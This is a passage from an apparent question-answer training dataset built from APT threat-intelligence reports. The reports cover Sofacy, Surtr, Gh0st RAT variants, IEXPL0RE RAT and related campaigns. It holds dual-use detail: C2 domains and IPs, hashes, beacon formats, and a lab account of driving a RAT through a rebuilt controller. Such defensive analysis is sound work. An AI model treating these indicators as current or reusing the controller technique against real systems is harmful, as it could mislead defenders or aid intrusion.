build=0x7caa0e19\nFigure 2 Decrypted HTTP POST Data Shows System Information\nThe clear text of the data sent in the network beacons contains information regarding the compromised system, as well as malware-specific information. The data is comprised of the following fields of data:\nid = The serial number of the storage device\nw = This parameter (whose name 'w' could change to any character between samples) begins with a one byte value denoting the OS version followed by a one byte value for the CPU architecture. These values are immediately followed by a new line delimited list of running processes on the system.\ndisk = The name of the system's hard drive, obtained from the registry key \"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\\0\"\nbuild = The hardcoded build identifier for the Trojan version\ninject = (Optional, not displayed in Figure 2) If the Trojan injected its code into other processes to interact with the C2 server\nThis callback data allows the threat actors to determine if the infected machine is a target of interest, as the beacon contains a list of running processes and the name of the storage device that could be used to filter out analysis systems or researchers. If the actors believe the system is of interest, they will respond to these network beacons to download and execute additional secondary payloads on the system. The Trojan parses the response to the beacons for two actions \"Execute\" and \"Delete\" between the tags \"[file]\" and \"[/file]\", as well as settings labeled \"FileName\", \"PathToSave\", \"Rundll\" and \"IP\" between the tags \"[settings]\" and \"[/settings]\". This allows the threat actors to download additional files to the system, execute both executables and DLLs and delete files.\nBig Headline: The Infrastructure\nThe initial analyzed sample in this attack only contained a single malicious command and control location, 191.101.31.6. We have not observed this IP address used by the Sofacy group in any previous attack campaigns, and examining passive DNS data showed no other correlations to potentially related attacks. The sample also seen by Prevenity appeared to only have a single primary C2 domain, servicecdp[.]com. This domain also appears to be newly created for this specific attack campaign, with no strong links to any previous attacks.\nPivoting off the unique registry key used for persistence revealed links to a previously observed Sofacy campaign, from mid-2015. Two additional payloads with recent compile dates of March 7, 2016, were discovered using the same persistence mechanism, and analysis of those payloads revealed one primary C2 domain, munimonoce[.]com, and three secondary C2 domains, www.wscapi[.]com, www.tabsync[.]net, and storsvc[.]org. The secondary C2 domains may appear familiar, as they were widely publicized in (<https://www.isightpartners.com/2015/07/microsoft-office-zero-day-cve-2015-2424-leveraged-by-tsar-team/>)a report from iSight Partners in July 2015 as C2 domains related to the Sofacy group aka Tsar Team.\nIn addition, the primary C2 domain munimonoce[.]com previously had resolved to the IP 66.172.11.207, which was previously identified as a primary C2 IP for a Sofacy payload with a compile timestamp of June 11, 2015. This particular sample also happened to use the exact same secondary C2 domains of (<>)www.wscapi[.]com, (<>)www.tabsync[.]net, and storsvc[.]org, but lacked the newly discovered persistence mechanism.\nThe Sofacy group often re-uses infrastructure components across multiple attack campaigns, whether to speed the flow of attacks, for a lack of available resources committed, or out of sheer laziness. In this case, the newer attack campaign appears to use newly created infrastructure, but still maintains some overlap with previous Sofacy-related C2s. We believe this overlap could possibly be due to an oversight when adapting a previous code base with the new persistence method discussed in this blog for the new attack campaign.\nThe threat appears to be moving toward deployment of one-off infrastructure that can make analysis of attack campaigns and correlation more challenging. This shift stresses the importance of analysts and researchers being able to pivot on all artifacts of a given attack, not simply relying on network indicators. In this case, we were able use AutoFocus to pivot on a common registry key unique to this attack campaign to quickly identify where it correlates with characteristics of previous attacks.\n\nHow does the Sofacy Trojan handle responses from the C2 server, and what actions can it perform based on these responses?",
    "output": "A: The Sofacy Trojan parses responses to its network beacons for two actions: 'Execute' and 'Delete', specified between the tags '[file]' and '[/file]', and settings labeled 'FileName', 'PathToSave', 'Rundll', and 'IP' between the tags '[settings]' and '[/settings]'. Based on these responses, the Trojan can download additional files to the system, execute both executables and DLLs, and delete files. This capability allows threat actors to further compromise the system and deploy additional malicious payloads.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Win32/Potao malware ensure that each dropped instance of its main DLL has a unique binary hash? Explain the technique used.",
    "output": "The Win32/Potao malware ensures that each dropped instance of its main DLL has a unique binary hash by applying a simple trick. The Potao dropper patches the name of the Enter export function in the DLL file's export address table to the LUID value. For example, Enter might be renamed to _85fc. This modification results in every dropped instance of the DLL having a unique binary hash, making it harder to detect using traditional signature-based methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Delivery Mechanism\nWhile the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a vulnerability in Microsoft Word: CVE-2012-0158.\nThis particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012. Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).\nThe malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups. This template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the vulnerability description, it utilizes the Chartspace Office Web Component. This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.\nFigure 1: Hexdump of the malicious attachment\nAlthough CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially detected by three AV engines (on VT). Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products. This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.\nThis vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments.\nMalicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory.\nBig Headline: Payload\nSurtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function.\nIt also creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/123\n%ALL USERS%/Application Data/Microsoft/Windows/Burn\n%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem\nIt creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders. The copy in the Burn folder is called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll. These copies will differ from the original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes. This also results in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.\nSurtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. This particular sample connects to internet.3-a.net on port 9696.\nIn May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.\nThe stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we have seen an alternate stage two used with the name Remote.dll as well. Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks.\nSurtr's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands and logging keystrokes.\nIn order to store temporary information, Surtr creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/MpCache\n%ALL USERS%/Application Data/Microsoft/Windows/nView_DiskLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_KeyLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_skins\n%ALL USERS%/Application Data/Microsoft/Windows/UsbLoydb\nFor example, in nView_DiskLoydb, a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output. The keylogger output is disguised by adding a constant to the ordinal value of the character.\nThis data can then be sent to the C2. It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression.\nIt can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing the victim computer's webcam or microphone. In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware.\nFor persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its C2 information and a campaign code in the registry.\nDepending on the configuration, Surtr will either create multiple registry keys in Software\\Microsoft\\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data. These are usually xor encrypted with a key of 0\u00d71.\nFigure 2: Encrypted data in XC key\nBig Headline: Other Samples & Variations\nWe have seen a large number of similar samples sent to Tibetan groups that use the same stage two (GmRemote) and communicate with the following C2s: dtl.dnsd.me, dtl.eatuo.com, dtl6.mooo.com and tbwm.wlyf.org. These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.\nOne particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the initial Surtr infection. This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103. This domain also resolved to the same IP as the dtl domains.\nWe have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be targeted at commercial and government targets.\nThe first sample was found via ThreatExpert. It uses campaign code kmlg-0308, and connects to a C2 at flyoutside.com. This domain and eight others are registered to toucan6712@163.com:\nSearching for more samples in Virus Total Intelligence (VTI) using domains and other identifying features reveals four related files:\n7fbdd7cb8b46291e944fcecd5f97d135 \u2013 connects to C2 domain www.flyoutside.com, campaign code kmlg-0409tb\n58ff38412ebbedb611a3afe4b3dbd8b0 \u2013 connects to C2 IP 112.121.182.149 (similar to above), campaign code lly-0311\n81bc8974967e1c911b107a9a91e3178b \u2013 connects to C2 domain www.paulfrank166.2waky.com (192.198.85.102), campaign code 0201-2116\n44758b9a7a6cafd1b8d1bd4c773a2577 \u2013 connects to C2 domain www.flyoutside.com (same as the first sample found on ThreatExpert), campaign code lg-0109\nMost of these samples have campaign codes that suggest commercial targets. However, we do not have information about where these samples were submitted from, so the target sector and victims cannot be confirmed.\nA second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva. This sample connects to google.djkcc.com and uses campaign code in1102. Other subdomains under djkcc.com include:\nairforce.djkcc.com\ndomain.djkcc.com\ngoogle.djkcc.com\nindianembassy.djkcc.com\nmailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)\nmicrosoft.djkcc.com\nrediffmail.djkcc.com (Rediffmail is an Indian email site)\nWhile we do not have information about what victims these samples target, the campaign code, C2 domain, and related subdomains give some possible indications.\nOne additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5 e7e1c69496ad7cf093945d3380a2c6f4).\nIt exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced in other GmRemote samples, although none of them have any real content.\nThese additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors.\nRead the text above and answer this question: How does the Surtr malware exploit the CVE-2012-0158 vulnerability in Microsoft Word, and why might this approach be effective even though the vulnerability was patched over a year before the attack?",
    "output": "The Surtr malware exploits the CVE-2012-0158 vulnerability by utilizing a shared template that employs the Chartspace Office Web Component, which either suffers from the same vulnerability or uses one of the named ActiveX controls, allowing the attacker to execute malicious code. This approach is effective because, despite the vulnerability being patched in April 2012, the specific template used in the attack was only initially detected by three antivirus engines on VirusTotal. This highlights that even year-old vulnerabilities can be exploited if the attack is designed in a way that evades most antivirus detections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Standard Gh0st RAT Protocol\nThe standard network protocol for Gh0st RAT 3.6 employs zlib compression, which utilizes 'Gh0st' as a static five-byte packet flag that must be included in the first five bytes of initial transmission from the victim (as seen in Figure 1). During the initial login request, the 3.6 version of Gh0st RAT enumerates system information and transmits that information to the controller. The proceeding eight bytes of the packet contain both compressed and uncompressed size information followed by the zlib compressed data, starting with bytes 78 9C at offset 14 (shown in Figures 1 and 2, below).\nMedium Headline: Victim to controller\nAfter a successful login, the controller returns an acknowledgment to the victim with the correct header using the packet flag which it is programmed to verify, as seen in Figure 2. The connection will be established only if the packet flags match.\nFollowing the first five bytes, the packet then shows the full packet size and the uncompressed data size. The Gh0st packet header for version 3.6 uses the 13-byte format shown in Figure 3:\nAfter the packet flag, packet length and unzip length have been verified, a working connection is created between the victim and the controller. Subsequent keep-alive transmissions ensure a continuous connection.\nOnce Gh0st RAT is connected, the attacker has full remote administration tool (RAT) functionality via the controller. Available remote functionality includes:\n\u2022 Fully functional remote desktop display, including the ability to remotely block user input\n\u2022 Fully functional file manager that lists local and network drives\n\u2022 Ability to interact with running processes\n\u2022 Ability to interact via the command console\n\u2022 Key logging\n\u2022 Audio capture\n\u2022 Webcam capture\n\u2022 Ability to send 'Windows style' alerts to the victim, which can display any text the attacker enters into the controller\nThese features ensure complete remote control of the computer.\nBig Headline: Changes to the Gh0st RAT Protocol\nIn an older version of the customized Gh0st RAT malware, the protocol packet flag is no longer represented by the string 'Gh0st'. The Ghost Dragon group modified the source code and changed the packet flag to 'XYTvn', as seen in Figure 4. The packet structure still implements the same 13-byte header format, including the starting zlib compression bytes of '78 9C':\nSample: f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197\nIn a more recent version of the modified Gh0st RAT malware, Ghost Dragon implemented dynamic packet flags which change the first five bytes of the header in every login request with the controller. This complicates identifying its network traffic, as the header bytes in the zlib compressed data section no longer start with '78 9C', as shown in Figure 5.\nIn some cases this was achieved through a simple XOR obfuscation of the packet data, beginning with the zlib header. SPEAR has observed numerous different XOR keys utilized by the group. No changes to the compression have been found; however, it is trivial to implement a modified compression protocol.\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\n(Note: At the time of this report, the C2 for the sample was active and the malware could still establish an active connection to the Ghost Dragon controller at bbs.winupdate[dot]net. Currently, the domain bbs.winupdate[dot]net resolves to 122.10.18[dot]166).\nThe reply from the active command and control server can be seen in Figure 6:\nSample: 1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42\nBig Headline: Connecting to the Ghost Dragon Malware\nAfter successful identification of the malware as Gh0st RAT and confirmation of the modified command and control protocol, the final step toward verification was to connect with the malware to ensure that it would parse the normal Gh0st RAT commands.\nI was able to compile a custom controller from the source code for the purposes of testing the Ghost Dragon malware. I bypassed the header checks looking for the 'Gh0st' packet flag, and reprogrammed the standard Gh0st RAT controller to reply with the packet flag sent from the victim.\nI used sample 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df for testing, which was executed by f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197 during analysis on Windows XP. This sample transmitted the static five byte packet flag 'XYTvn'.\nI ran the victim malware and changed the host's file to point the domain to a host-only IP address. I received a connection attempt from the victim and a response from the controller returned the correct packet flag. Afterward, the keep-alive packets between the victim and controller maintained the connection, which allowed me to test the functionality of 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df with the custom Gh0st RAT controller.\nThe following screen shots were obtained while connected to the malware:\nThe HOSTNAME field shown in Figure 7 was programmed in my custom controller to display 'Gh0st variant', just in case the incoming structure parsed from the victim did not match the format of the default 'LOGININFO' structure from Gh0st RAT 3.6.\nI attained full functionality using the Gh0st 3.6 protocol in the controller, despite the fact that the incoming structure was not exactly what my customized controller expected. As shown in Figure 8, I successfully added an\nadministrative user while remotely connected via my custom Gh0st RAT console within the malware dropped from sample f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197.\nFigure 8 demonstrates that some of the characters in the window are not in English and are not displayed properly on the form. This is due to the fact that the characters were written in Mandarin in the original Gh0st RAT 3.6 source. I changed phrases in the main connection window (Figure 7) for demonstration purposes only.\nThe remaining features of the Gh0st RAT protocol were tested successfully with the custom Gh0st RAT controller while connected to 6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df.\nAdditional analysis into other samples is ongoing and more information will be forthcoming.\nNetwork IOCs and Infrastructure Overlap\nQuestion: What steps were taken to verify the functionality of the Ghost Dragon malware, and how was the custom Gh0st RAT controller adapted to communicate with the modified malware?",
    "output": "Answer: To verify the functionality of the Ghost Dragon malware, the researcher compiled a custom controller from the source code and bypassed the header checks looking for the 'Gh0st' packet flag. The standard Gh0st RAT controller was reprogrammed to reply with the packet flag sent from the victim. The researcher used a sample of the malware, executed it on Windows XP, and modified the host's file to point the domain to a host-only IP address. Upon receiving a connection attempt from the victim, the controller responded with the correct packet flag, maintaining the connection with keep-alive packets. This allowed the researcher to test the functionality of the malware using the custom Gh0st RAT controller, achieving full functionality despite the incoming structure not matching the expected format.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the researchers link the individual 'Jimycocowell' to the Winnti group, and what methods did they use to decode the C&C domains in the bot control messages?",
    "output": "The researchers linked 'Jimycocowell' to the Winnti group by finding bot control messages left by this individual on public resources. The messages contained ciphered C&C domains, which were decoded using two different methods. The first method involved RC4 encryption with hex binary values, while the second method used XOR with a fixed byte value followed by BASE64 encoding. The prevalence of the second type of message suggests it was used in the next version of the backdoor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: INTRODUCTION\nThis report describes a remote access trojan (RAT) that three human rights-related organizations taking part in a Citizen Lab study on (<https://citizenlab.org/hrpublic-call/>)targeted cyber threats against human rights groups received via email in 2011 and at the end of 2010. Here we refer to it as the IEXPL0RE RAT, after the name of the launcher program. It was first called \"Sharky RAT\" in (<https://citizenlab.org/2011/10/citizen-lab-senior-security-analyst-seth-hardy-presents-at-sector-conference/>)Seth Hardy's talk at SecTor 2011. Since then it has also been referred to as (<http://ioc.forensicartifacts.com/2012/07/c0d0so0-trojan/>)c0d0so0 and possibly (<http://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99&tabid=2>)Backdoor.Briba.\nA RAT is a program that allows a remote user full access to a computer. This type of program can be used for legitimate reasons. In these cases, RAT can also stand for remote administration tool. In the case of the IEXPL0RE RAT, the remote user has the ability to record user keystrokes (including passwords), copy and delete files, download and run new programs, and even use the computer's microphone and camera to listen to and watch the user in real-time.\nRATs are common in (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_trends-in-targeted-attacks.pdf>)targeted malware attacks against human rights organizations and other NGOs. Targeted attacks with this sort of payload are often referred to as advanced persistent threats (APTs). APTs differ from other traditional computer attacks in that they are designed to be quiet and collect data over time, and act as a starting point for future tracking and compromise of targets. It is not uncommon for an APT infection to persist for months or even years after the malicious program is first run.\nQ: How does the IEXPL0RE RAT differ from traditional computer attacks, and what specific capabilities does it possess that make it particularly dangerous for human rights organizations and NGOs?",
    "output": "The IEXPL0RE RAT differs from traditional computer attacks because it is designed to be quiet and collect data over time, acting as a starting point for future tracking and compromise of targets. This type of attack is often referred to as an advanced persistent threat (APT). Unlike traditional attacks, which might be noisy and immediate, APTs can persist for months or even years after the initial infection. Specifically, the IEXPL0RE RAT allows a remote user full access to a computer, including the ability to record user keystrokes (including passwords), copy and delete files, download and run new programs, and even use the computer's microphone and camera to listen to and watch the user in real-time. These capabilities make it particularly dangerous for human rights organizations and NGOs, as it can lead to long-term surveillance and data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Background\nWhile investigating some of the smaller name servers that APT28/Sofacy routinely use to host their infrastructure, Cylance discovered another prolonged campaign that appeared to exclusively target Japanese companies and individuals that began around August 2016. The later registration style was eerily close to previously registered APT28 domains, however, the malware used in the attacks did not seem to line up at all. During the course of our investigation, JPCERT published (<https://www.jpcert.or.jp/magazine/acreport-ChChes.html>)this analysis of one of the group's backdoors. Cylance tracks this threat group internally as 'Snake Wine'.\nWe found the infrastructure to be significantly larger than documented at the link above. Cylance believes some of the steps taken by the attacker could possibly be an attempt at a larger disinformation campaign based upon some of the older infrastructure that would link it to a well-known CN-APT group. Nearly all of the initial data in this case was gathered from delving further into the domains hosted by 'It Itch.' South Korea's National Intelligence Service (NIS) previously leveraged It Itch's services, as documented by Citizen Lab (<https://citizenlab.org/2015/08/what-we-know-about-the-south-korea-niss-use-of-hacking-teams-rcs/>)in this post. A number of the samples were signed using the leaked code-signing certificate from the Hacking Team breach.\n\nQuestion: How does the use of leaked code-signing certificates from the Hacking Team breach by the Snake Wine threat group complicate attribution efforts and what potential implications does this have for cybersecurity professionals?\n\nAnswer:",
    "output": "The use of leaked code-signing certificates from the Hacking Team breach by the Snake Wine threat group complicates attribution efforts because it allows the attackers to sign their malware with legitimate certificates, making it appear more trustworthy and potentially misleading investigators. This tactic can create confusion about the true origin of the attack, as it might suggest involvement from different groups or entities. For cybersecurity professionals, this means they must be extra vigilant and not rely solely on certificate validity to determine the legitimacy of software. They need to employ additional verification methods and thorough analysis to accurately attribute attacks and understand the full scope of the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: COPYRIGHT\t NOTICE\nCopyright \u00a9 Command Five Pty\t Ltd. All rights reserved.\nThis\t document\t is\t provided by\t the copyright holders under the licence that follows.\t By obtaining, using,\t and/or distributing this document you agree that\t you have read, understood,\t and\t agree to the terms and conditions that follow.\nThe names and trademarks of Command Five Pty Ltd may\t not be used in advertising or publicity\t relating to this document or its\t contents without specific,\t prior,\t written permission.\nNo permission is given for this document to be used\t for commercial purposes or as part\t of\t any\t commercial activity\t or undertaking, including,\t but not\t limited to, use in or relating\t to advertising\t or publicity,\t and/or use in support of, or as part of, any\t pre\u00adsales or sales activities.\nNo permission is given to create modified or derivative works.\t You may\t distribute this\t document\t in its original form for non\u00adcommercial purposes in accordance with\t the other terms and\t conditions stated herein. Copyright title will at all times remain with the copyright holders.\nAll referenced trademarks remain the property\t of\t their respective owners.\nTHIS DOCUMENT\t IS PROVIDED 'AS\t IS' FOR INFORMATIONAL PURPOSES ONLY WITH NO REPRESENTATIONS OR WARRANTIES\t OF ANY KIND, INCLUDING BUT NOT LIMITED TO ANY WARRANTY, EXPRESS OR IMPLIED, OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE; WARRANTY OF\t NON\u00adINFRINGEMENT, OR TITLE; NOR ANY WARRANTIES\t PERTAINING TO\t THE ACCURACY OR COMPLETENESS OF CONTENT.\nANY OPINIONS\t EXPRESSED IN THIS DOCUMENT MAY CHANGE WITHOUT NOTICE AND\t ARE NOT NECESSARILY THE CONSIDERED OPINIONS\t OF\t COMMAND\t FIVE PTY LTD, ITS PARTNERS,\t EMPLOYEES, OR AFFILIATE\t ORGANISATIONS.\t ANY ADVICE OFFERED IN THIS DOCUMENT IS OFFERED\tWITHOUT WARRANTY OF ANY KIND.\nCommand Five Pty\t Ltd\nABN:\t49 149\t 576\t670\nhttp://www.commandfive.com info@commandfive.com\nQuestion: How does the copyright notice of the 'C5_APT_ADecadeInReview' report specify the permitted and restricted uses of the document?",
    "output": "Answer: The copyright notice specifies that the document is provided under a license that allows distribution for non-commercial purposes in its original form, while retaining copyright title with the copyright holders. It restricts the use of the document for commercial purposes, including advertising, publicity, and sales activities. Additionally, it prohibits the creation of modified or derivative works. The document is provided 'as is' for informational purposes only, with no representations or warranties of any kind, including warranties of merchantability, fitness for a particular purpose, non-infringement, or title. Opinions expressed in the document may change without notice and are not necessarily the considered opinions of Command Five Pty Ltd or its affiliates. Any advice offered is provided without warranty.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Air Force\nThe People's Liberation Army Air Force (PLAAF) is the third largest air force in the world behind the United States and Russia. The PLAAF employs 250,000 personnel and 1,762 combat aircraft (IISS 2008). The Soviet Union helped found the PLAAF in 1949, providing aircraft in 1951, and production technology and pilot training in 1953. China gained limited air combat experience during the Korean War. In 1956 China began assembling its own aircraft based on Soviet design, such as the J-2, J-5, and J-6, copies of the MiG-15, Mig-17, and Mig-19 respectively. The Sino-Soviet split was a significant setback to the PLAAF as was resource competition with the missile and nuclear divisions of the military. China's aircraft industry received a boost during the Vietnam War by providing aircraft for North Vietnam.\nDuring the 1980s, the PLAAF underwent significant restructuring, opting for a more streamlined force and increased training. Due to the Sino-Soviet Split, the PLAAF turned to Western states for military expertise. Western states saw China as a counterbalance to the Soviet Union; however support dissolved following the 1989 Tiananmen Square incident.  Reverse engineering of Soviet weaponry continued with the Chinese aircraft F-7 being an illegitimate copy of the MiG-21, and the F-8 incorporating various Soviet designs.  Gorbachev's 1989 visit to China marked an end to the Sino-Soviet split. The newborn and economically struggling state of Russia used the transfer of military technology and expertise to China as a way to sustain its own aerospace industry (Moore 2000).\nThe collapse of The Soviet Union, and concerns over a Taiwan conflict that could draw in the United States, reinvigorated the PLAAF's modernization program. In the 1990s, China began development of fourth generation fighters, including the J-10 and a collaboration with Pakistan on the JF-17. China continued focusing on improved pilot training and retiring obsolete aircraft, preferring quality over quantity. The PLAAF is currently developing its own fifth generation stealth craft and increasing Command, Control, Communications, Computers, Intelligence, Surveillance and Reconnaissance (C4ISR) systems for all its fighters.\nIn addition to jet fighter aircraft, \"China is upgrading its B-6 bomber fleet (originally adapted from the Russian Tu-16) with a new variant which, when operational, will be armed with a new long-range cruise missile\" (Annual Report to Congress 2008). China is also developing Airborne Early Warning and Control (AEW&C) aircraft utilizing Russian and possibly Israeli technology; and is making progress in tanker aircraft used for in-flight refuelling and airlift planes. These are important steps in obtaining the capability to conduct operations beyond China's borders (China's National Defense in 2006; Allen 2005).\nProduction of indigenous Chinese aircraft has been lacklustre. Most of the designs require foreign expertise which is then reverse engineered. The technology obtained is often one generation old at the time of acquisition, as states do not want to give up their advantage. Further, to reverse engineer they not only need the aircraft itself, but also high-precision and technologically advanced machine tools, electronics and components, skilled personnel, and facilities. By the time the technology is fully understood, and indigenous versions produced, the aircraft may be two or three generations behind the latest models of the world's advanced military forces. China is not alone in this difficulty. Except for the five largest industrial arms producers (France, Germany, Russia, the UK, and the US), other countries that have attempted to produce indigenously designed combat aircraft, such as Israel, South Africa, India, Taiwan, and South Korea, have abandoned their efforts and returned to importing systems from one of the five main producers. One reason is the economy of scale involved with financing research, development, and production of all of the systems and sub-systems that compose modern combat aircraft (Moore 2000; see also Allen, Krumel and Pollack 1995). Despite these difficulties, China remains committed to producing indigenous aircraft. Continued purchase of foreign technology demonstrates that the Chinese believe reverse engineering and then upgrading is the best approach to establish themselves as a self-sufficient producer in the future. In other words, the PRC aspires to become one of the elite weapons producers, but it does not want to wait for the infrastructure to evolve; it wants to leapfrog these capabilities.\nMedium Headline: Space\nThe PLA is responsible for the Chinese space program. China was the fifth nation in the world to place a satellite in orbit, the third nation to put a human into space, and the third nation to successfully test an anti-satellite weapon (ASAT) capable of destroying an enemy satellite in low earth orbit. China's manned space activities have received substantial support from Russia. This can be seen in the design of the Shenzhou spacecraft, which closely resembles the Russian Soyuz spacecraft. Although China's commercial space program has utility for non-military research, it also demonstrates space launch and control capabilities that have direct military application. All taikonauts have been selected from members of the PLAAF, and the PLA has deployed space-based systems for military purposes. These include imagery intelligence satellite systems such as the ZiYan series and JianBing series, synthetic aperture satellites (SAR) such as JianBing-5, the BeiDou satellite navigation network, and secured communication satellites such as FengHuo-1. China launched its 100th Long March series rocket in 2007, and continues to put more sophisticated and diverse satellites into orbit. The PRC is developing the Long March 5, an improved heavy-lift rocket that will be able to lift larger reconnaissance satellites into low-earth orbit or communications satellites into geosynchronous orbits by 2012. It expects to replace all foreign-produced satellites in its inventory with indigenously produced sun-synchronous and geo-stationary models by 2010 (Annual Report to Congress 2008; Center for Strategic and International Studies 2003).\nMany of China's space assets are dual use, having financial and prestige benefits in addition to military applications. The Ziyuan-2 series, the Yaogan-1 and -2, the Haiyang-1B, the CBERS-1 and -2 satellites, and the Huanjing satellites, offer ocean surveillance, disaster and environmental monitoring, and high resolution imaging in the visible, infrared, and radar spectrums. New electro-optical satellites are capable of penetrating night and weather with a 1/10 meter resolution, providing near continuous targeting data for the PLA forces. In the arena of navigation and timing, China has five BeiDou satellites with 20 meter accuracy over\nthe region. The PRC also uses the Russian GLONASS navigation system and is a primary investor in the European Union's Galileo navigation system. China has developed small satellite design and production facilities, and is developing microsatellites, satellites which weigh less than 100 kilograms. These satellites offer remote sensing, imagery, and radar, and could allow China to rapidly replace or expand its satellite force in the event of war or a disruption to the network. The country is also improving its ability to track and identify foreign satellites, which is an essential component in the event of counter-space operations. China's successful test of an ASAT weapon demonstrates an ability to strike enemy assets in low earth orbit. This acts as a deterrent to conflict and demonstrates the PRC's commitment to relatively low-cost asymmetric warfare (International Assessment and Strategy Center 2005).\n\nWhat are the key technological advancements and strategies employed by the PLAAF to enhance its C4ISR systems and overall operational capabilities beyond China's borders?",
    "output": "The PLAAF is currently developing its own fifth-generation stealth craft and enhancing its Command, Control, Communications, Computers, Intelligence, Surveillance, and Reconnaissance (C4ISR) systems for all its fighters. Additionally, China is upgrading its B-6 bomber fleet with a new variant equipped with long-range cruise missiles. The PLAAF is also developing Airborne Early Warning and Control (AEW&C) aircraft using Russian and possibly Israeli technology, as well as tanker aircraft for in-flight refueling and airlift planes. These advancements are crucial for conducting operations beyond China's borders, demonstrating a commitment to modernizing and expanding its capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the operators structure their infrastructure to support different types of malicious activities, and what specific actions did they take to target Epoch Times?",
    "output": "The operators structured their infrastructure by using two servers for different purposes: one for phishing and reconnaissance activities and another to serve malware. On February 26, 2017, the operators registered a fake domain mimicking the main Epoch Times domain (epochatimes[.]com), which added an additional 'a' after 'epoch'. They hosted this fake domain on the same server as the fake CDT and Mingjing pages (43.240.14[.]37). Additionally, Epoch Times found a Cloudie IP (103.200.31[.]164) that sent 24,183 requests during a 12-hour period on March 8, 2017, to the subscription page of Epoch Times, indicating attempts to enumerate HTTP paths.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
